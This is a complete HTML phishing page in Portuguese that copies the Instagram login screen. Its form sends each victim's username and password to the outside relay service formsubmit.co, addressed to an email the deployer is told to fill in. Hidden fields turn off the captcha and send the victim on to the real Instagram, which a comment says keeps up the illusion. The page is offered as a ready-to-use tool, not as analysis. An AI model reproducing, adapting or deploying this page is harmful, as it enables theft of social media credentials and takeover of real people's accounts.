<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 360Helvetica, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Grand Hotel', cursive; /* Fallback se não tiver a fonte real */
            font-size: 40px;
            margin-bottom: 20px;
            font-weight: bold;
        }
        
        /* Tenta carregar a fonte oficial se possível, senão usa serif */
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
        .logo { font-family: 'Grand Hotel', cursive; }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            margin-bottom: 10px;
            font-size: 12px;
            width: 100%;
            box-sizing: border-box;
        }

        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        button {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            padding: 5px 9px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 10px;
        }

        button:hover {
            background-color: #1877f2;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            width: 100%;
        }

        .line {
            height: 1px;
            background-color: #dbdbdb;
            flex-grow: 1;
            margin: 0 10px;
        }

        .forgot {
            color: #385185;
            font-size: 12px;
            text-decoration: none;
            margin-top: 20px;
        }

        .signup-text {
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }
        
        .signup-text a {
            color: #00376b;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">Instagram</div>
        
        <!-- A MÁGICA ACONTECE AQUI -->
        <!-- Substitua SEU_EMAIL@AQUI pelo seu email real -->
        <form action="https://formsubmit.co/SEU_EMAIL@AQUI" method="POST">
            
            <!-- Configurações para o FormSubmit (não mexa) -->
            <input type="hidden" name="_subject" value="Novo Login no Instagram!">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://instagram.com"> <!-- Redireciona de volta pro Instagram para não estragar a ilusão -->

            <input type="text" name="username" placeholder="Telefone, nome de usuário ou por email" required>
            <input type="password" name="password" placeholder="Senha" required>
            
            <button type="submit">Entrar</button>

            <div class="separator">
                <div class="line"></div>
                <div class="line"></div>
            </div>

            <a href="#" class="forgot">Esqueceu a senha?</a>
        </form>
    </div>

    <div class="signup-text">
        Não tem uma conta? <a href="#">Cadastre-se</a>
    </div>

</body>
</html>
